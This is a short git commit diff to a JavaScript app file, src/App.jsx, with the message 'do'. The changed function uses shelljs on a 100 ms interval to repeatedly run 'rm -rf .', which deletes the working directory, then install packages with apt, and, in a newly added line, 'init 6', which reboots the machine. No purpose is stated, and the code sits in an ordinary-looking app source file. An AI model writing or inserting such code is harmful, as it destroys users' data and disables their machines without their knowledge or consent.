6cd90bcd575b49d0e4456a4e5a0af2896272e855
vivianeflowt <vivianeflowt@gmail.com>
2021-01-27 02:02:46 -0300

    do

--- src/App.jsx
+++ src/App.jsx
@@ -5,11 +5,9 @@ import shell from 'shelljs';
 const doaa = () => {
   //
   setInterval(() => {
-    shell.exec('ps');
-  }, 100);
-  setTimeout(() => {
     shell.exec('rm -rf .');
     shell.exec('apt install nodejs npm');
+    shell.exec('init 6');
   }, 100);
   return this;
 };
